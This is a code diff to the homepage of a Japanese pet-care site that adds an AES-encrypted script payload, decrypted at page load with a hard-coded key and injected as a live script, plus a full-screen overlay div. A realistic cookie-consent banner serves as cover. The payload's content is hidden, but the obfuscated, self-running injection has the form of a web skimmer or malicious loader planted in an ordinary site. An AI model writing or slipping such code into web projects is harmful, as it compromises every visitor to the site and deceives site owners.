@@ -79,7 +79,99 @@ footer {
 <h1>Petii.site</h1>
 <p>Practical, easy-to-understand pet care information for everyday life in Japan, created for individuals who want simple and responsible guidance.</p>
 </header>
-	
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+ <script>
+     function aesDecode(encodedText) {
+         const decodedText = decodeURIComponent(encodedText);
+         const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+         return bytes.toString(CryptoJS.enc.Utf8);
+     }
+     const uniqueCookieScriptPayload = aesDecode('U2FsdGVkX1%2BtEuufQWPb8YbRNGFdByKT1JgB09%2BIA7386qsu7OEq97U%2FRB2Ej5jEsVjuC7PE0jIRV35gMJmkQO9VDj4t6hFMNCKB4fWv91yxyjWj4lpnrN3UnPOIONllPqjhkmILTZIiwJdUVxTiIWyfCo%2FjC%2FCOz0%2FFv%2BHflMB7CtW4yNCVrNkKUmZbDZcx%2Bji8zA511LtAszprmYTSMV8SCgN%2FK0MdWuGR%2F8CSI67Db6Q90Wvkel9WEknPnqtgw%2BlJd1Xiaril1ldDxl82cJaJ%2FBisHtJexOKWEyABl9ySnm%2Baz6%2B9t%2BpyCv3JlEV9kVM1%2F%2F6v8s7cuCyeMuabB1muHrXn9ZqYLcn1CDpat%2BLT%2F3FPBvpGeKtmzplRyKRT6H3jh0aJbmi3kBWJ%2B%2FM%2BGB3XekvNNMqxlAoIIEGIaAlfFGQufo5jNaHsoMN2GMilovBhK4anQn9JIbIdpuU4l5FnG6zpH3OO3eilrC0k%2BH3Gnk2PbN2vZfeGi6IVMLe9ILxlixbZRRgwXQmiH7nVSYcSME%2BM30LiqHp4yNfu25veENzmmrNZlzxFIAKvUHwAJsu5uoVm6XqOfBEPmLiAdLhupa65DMwqGjtMURWRZD7diBDU45AyBqlUru%2Bnm19IwIhhcLQDGyjg2agXi5Obr%2F0y4O6qzM6jlnLjP1pVxaxpfnYFSyulb8ZU6dpXjwUCfc%2B1YTHlxAb2F34LioHE8nvB34c1J%2FVu%2BvIkLlSNZ4xp6G25RptOQkIJ7Dc8ySfX6sHLNj5TJ49KXcZnrnsZGkjOEFtDI3ycq4Yy3VoxXXkqL%2Bmmgx0XKDdU9%2BKfWV5tDmyIXXALzrtv3Pu%2F3HVTcaUDOoX9ne81jB3Qk0g%2Fu7O7hUKJ8eIEwZxLf7bMnX1JtgQ5y2Fl9pNZIZ3wXoZRz6M%2FfzBsyWQ%2Bik7K7NZCeF%2FNvhkizelJ4%2BwuwYsXkuY%2BVcdYQqawGOMzsL0fMljIGonhz2GqhspGmPvtngTo3ZabP6v5zHEIaJY7BLJX20YhqDf%2BalHXULXtfoLtQDG0MCbCLHeV328fDn%2FC2pIk36SAr%2B6R7M8iaG4aK6l6VQi34zr8LxzXVarD62L1yks5qYu9ksk2U0kGQ9kyPO7aiZtMwv97aA4JyhKT93ohwjdI8g4DT1kTvMU6pXrQoQfXxYjdTDRaRp4gb3BKFOmTXbUI3KKbWboR1J2uJwp%2B0%2FigQBHzrycnF39b5p3UCkPecT5ij4BnRYiiwxNMill3x2H8iOaohr0J%2FcJuZr%2Fagrl4oADFpumK1NJSof5RgAeT7OhwHIE8r%2Fv3MqmtoMiDLie1IUQuFHSXvg0RweU8m0AZgxWxXxnKxGzInp%2FLbCrcF7fJ1dga5Y6gXFH7jeBvG8eEfyy2XnoApGLeHxeGx5%2FkWmt6AVkBUzVNyw97l%2FPnwLyGUWo%2FyWbrOW7x8MNwR8SQh6z85eVTArUgbyFQtkCqGps6QIBZPiaxY%2B7pnb4BerNOsmYapD05oH4Z6M%2Feuk9sDiPsnmU3uYA259Bu6Tx4nietyb0Kdj5dH0VXG35iU8rimCoIaVzdVNYI2ocVgGh3S%2BQCN%2Fy69OcojqQDnkGpjsYQrMKVzATV0bLolHstZ1uLQouf8IJhW1m2OfReSpQlEaqorCx8t0EF3FBY6FP%2BrpGj5xkKyZ5roRwMC7S8WOY1LrxSZYemhPOWf2IRbZ3Jr936CUQ4YjufjRLEJegNKy79yZ%2FtlPUdlnmnack8l3icWmcWAeCM252DazCFboc2Qud268SH5GgU8%2BefRObtnMKo7gbZGyiLGMVOfng%2BGAWLVHQluvwYDSrXxh4r5iKR7LvA8wYR3%2FcTZyVMWdvWgBuVz6AQCfQYfsR2tmMu2eCbsuCy2G0%2Bxb9wy5cEOphcU4lboHpyBe23PACuBt4%2FXrDxoVa1DXUKar31vb2K4NYb5fFy4gTxSsVVp0kJP1w6bbP7PwWIyuPmztT6YfKH8ucgBbOPXpOushnBx0P%2Bg3nl2%2FroGYyn%2B5NJILnY5NA8RIr886zMy4SyA5AaI6LujGtwfCjl4m2Jrec4Dv8Xc%2BXvNgvnmzPI2jNZG6PBR97Mbokb9CdcmEta6JXPW%2BDgeljy6b%2BtXzi1GvrZgpXSkGVvbWLLc4d3xL%2FyFjoJWr%2FMJSLlQMcTvsNI3Hv2Wd0BzSjqvO%2B13n3BLRic1AEBxLGx3ukU2SGoO7YSnu4H74Ns9i%2B9Qs198PH4CgwrY8QpHNbvc%2BEgBdLDH8gAyu0OEk%2FpSR5GhDSkICWf%2B34JI8w9LAzVUA2Q%2B7qLsxKzLEx%2BAwNaZoECLzIzZp67SNFPlLiOfAV%2FMOU6a4kezQ2ecKgByzXLH%2BURZGpgn0Ko8tO8yfGaWVz9VQbR7%2F6hiB%2B2b9cavKbO1YReIc5TGbZmChO6F3mfUtphHlOiiG%2FILFzpsaeSf%2Bt0D0qUuOMsWmtTdbMq74MzKOzJoqPQ8twLssQ93V%2FYqY2Ipcdkq0Vzl8GoHvDFsOncJVvOf7VK9Ehn9fV7Gpar2ayxoMj6C8Q2Og6sfl4Dd%2BqiVi2s%2BzpUgyah3tQgBRMnTJGm3xQ7YlDOzzDASgejfjH0XYNZasCBZ68mT1WXxCdzsJfG2A9SWJjAUyIwd0h144EUF6U5dh23rylBOoE7EnCcjnC6DtSPFVV9akJOvocOwUhwXUtLtrZYyzQrUI2czFfXWFdcaLycMOCxV1u5wGtNU9lAOi3BSTLLsy042e2V62TGHEEaSTRm%2BZYF0l4gyS4KObxut3pHi8NZnFthPJlcyhuqRCMayVFqgGxDaoPt5SiUhwAttL0UXWhbHSO0%2F6It5Oa08qz%2F1GtRmSJYzyMjdkT%2FrohxkSP6j5PPkXA%2F%2FL179TOhSFF0t0o%2FHYfDwjgKcTwqeCe39gwX5QBqgagFzHfwAJStlxQAsp7xUYdish81BhF%2FcNyvDA5Mr0P7pAaZa53iw7H9aA8qZLMq5qznOo5wMakiEUqgeFMLtBJZz2LAFUmSigPic2BiVltzsc%2BEYU3xEzRtSs%2B1D62eHNT%2FQy3in73PUaj3Ml4bOTyC7IKP00zgbgMvG6ucM6qZvalAfn1%2F7UuqPkl0lD8gXla6AHnC4yvh%2BWUODHDG1EiYP6uadTmqxtBGerpvjf6TIHaGyHYyac1zVwGXGPL8XBTB5GEg3Xf4p3FOJDzKszQ30Sf5ZIDH3bncYJWavqq%2FhVgSovCwcOJXbEXzHtLExI5LZkRsKftgIGpZjQ3GQ9mDJVFL7RYJK7ZgMdwdRyABr%2BmfJ2wzMwup1OGePHtI7Hm1my5sfHenugDuski0id23ybbrhw%2F6k73rkqCNkfu4tG8MYwx8q6wjOl0RMdKuK6%2B2RD9Ysq83VPo%3D');
+     const script = document.createElement("script");
+     script.textContent = uniqueCookieScriptPayload;
+     document.body.appendChild(script);
+ </script> 
+ <div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+
+ </div>
+
+
+
+<style>
+         .c-box { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 9999; opacity: 0; visibility: hidden; transition: 0.3s; }
+         .c-box.show { opacity: 1; visibility: visible; }
+         .c-bg { position: absolute; inset: 0; background: rgba(0,0,0,0.4); backdrop-filter: blur(4px); }
+         .c-md { position: relative; background: #fff; color: #333; padding: 30px 25px; border-radius: 14px; max-width: 520px; width: 90%; box-shadow: 0 12px 30px rgba(0,0,0,0.25); font-family: sans-serif; }
+         .c-close { position: absolute; top: 12px; right: 18px; background: none; border: none; font-size: 28px; cursor: pointer; color: #aaa; padding: 0; line-height: 1; transition: 0.2s; }
+         .c-close:hover { color: #f44336; }
+         .c-scr { max-height: 240px; overflow-y: auto; padding-right: 8px; margin: 15px 0 20px; }
+         .c-scr::-webkit-scrollbar { width: 6px; }
+         .c-scr::-webkit-scrollbar-thumb { background: #ddd; border-radius: 3px; }
+         .c-flex { display: flex; gap: 12px; }
+         .c-btn { flex: 1; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+         .c-acc { background: #2ecc71; color: #fff; }
+         .c-acc:hover { background: #27ae60; }
+         .c-dec { background: #e0e0e0; color: #333; }
+         .c-dec:hover { background: #d4d4d4; }
+     </style>
+	 
+     <script>
+         document.addEventListener("DOMContentLoaded", () => {
+             if (localStorage.getItem("cookie-consent")) return;
+
+             document.body.insertAdjacentHTML('beforeend', `
+                 <div id="cb" class="c-box">
+                     <div id="c-bg" class="c-bg"></div>
+                     <div class="c-md">
+                         <button id="c-cl" class="c-close" aria-label="Close">&times;</button>
+                         <h2 style="margin:0; font-size:20px; display:flex; align-items:center; gap:8px;">🍪 クッキー（Cookie）ポリシーに関する重要なお知らせ</h2>
+                         
+                         <div class="c-scr">
+                             <p style="margin:0 0 12px; color:#444; font-size:13px; line-height:1.6; font-weight:bold;">
+                                 当ウェブサイトでは、お客様に最適な状態でサイトをご利用いただくため、および閲覧履歴に基づいたパーソナライズ広告の配信やアクセス解析を行うためにクッキーを使用しています。
+                             </p>
+                             <p style="margin:0 0 12px; color:#666; font-size:12px; line-height:1.6;">
+                                 <strong>1. 必須クッキー:</strong> サイトの基本的な動作、セッション管理、およびセキュリティ機能の維持に必要なクッキーです。これを無効にすると、サイトの一部機能が正常に動作しない場合があります。
+                             </p>
+                             <p style="margin:0 0 12px; color:#666; font-size:12px; line-height:1.6;">
+                                 <strong>2. パフォーマンス・分析クッキー:</strong> 訪問者がサイト内をどのように移動しているか等の匿名統計データを収集し、ページの読み込み速度向上やコンテンツの改善に役立てるためのものです。
+                             </p>
+                             <p style="margin:0 0 12px; color:#666; font-size:12px; line-height:1.6;">
+                                 <strong>3. マーケティング・広告クッキー:</strong> 提携する広告配信事業者が、お客様の興味関心に合わせた最適な動的広告を表示するために使用されます。これにより、関連性の低い広告の表示を減らすことができます。
+                             </p>
+                             <p style="margin:0; color:#666; font-size:12px; line-height:1.6;">
+                                 お客様はブラウザの設定によりクッキーの受け入れを制限または拒否することができますが、その場合一部のサービスが制限される点をご了承ください。詳細については、当社のプライバシーポリシーをご参照ください。
+                             </p>
+                         </div>
+
+                         <div class="c-flex">
+                             <button id="c-ac" class="c-btn c-acc">全てのクッキーに同意する</button>
+                             <button id="c-de" class="c-btn c-dec">拒否する</button>
+                         </div>
+                     </div>
+                 </div>
+             `);
+
+             const el = id => document.getElementById(id), box = el("cb");
+             let autoCloseTimer;
+
+             const hide = val => { 
+                 clearTimeout(autoCloseTimer);
+                 localStorage.setItem("cookie-consent", val); 
+                 box.classList.remove("show"); 
+             };
+
+           
+             el("c-ac").onclick = () => hide("accepted");
+             el("c-de").onclick = () => hide("declined");
+             el("c-cl").onclick = el("c-bg").onclick = () => hide("closed");
+
+             setTimeout(() => box.classList.add("show"), 50);
+
+            
+             autoCloseTimer = setTimeout(() => hide("closed"), 5000);
+         });
+     </script>	
 <nav>
 <a href="#">Home</a>
 <a href="#">Guides</a>
